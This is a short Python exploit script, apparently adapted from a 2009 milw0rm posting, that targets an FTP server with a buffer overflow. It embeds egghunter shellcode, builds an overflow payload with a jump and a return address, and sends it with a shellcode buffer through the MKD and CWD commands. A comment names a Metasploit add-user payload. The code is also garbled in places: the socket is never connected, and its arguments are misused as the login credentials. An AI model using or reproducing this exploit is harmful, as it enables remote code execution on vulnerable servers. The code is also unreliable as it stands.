#!/usr/bin/python
from time import sleep
from payload import buf
import socket
import struct
import socket,sys,struct
def shell_attack(target_machine, target_port):




# skape's egghunter shellcode
        shellunt=(
        b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
        b"\xef\xb8\x44\x7A\x32\x37\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

        # win32_adduser -  PASS=27 EXITFUNC=seh USER=dz Size=228 Encoder=PexFnstenvSub http://metasploit.com
     

        payload = b'\x41'*26
        payload += shellunt
        payload += b'\xEB\xDE\x90\x90'
        payload += b'\x87\x23\x02\x10'
        payload += b'\x44'*900

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      

        s.recv(1024)
        s.send(b'USER '+target_machine+b'\r\n')
        s.recv(1024)
        s.send(b'PASS '+target_port+b'\r\n')
        s.recv(1024)
        s.send(b'MKD '+buf+b'\r\n') # i placed the shellcode in the MKD command ;)
        s.recv(1024)
        s.send(b'CWD '+payload+b'\r\n')

        s.close()

        # milw0rm.com [2009-05-19]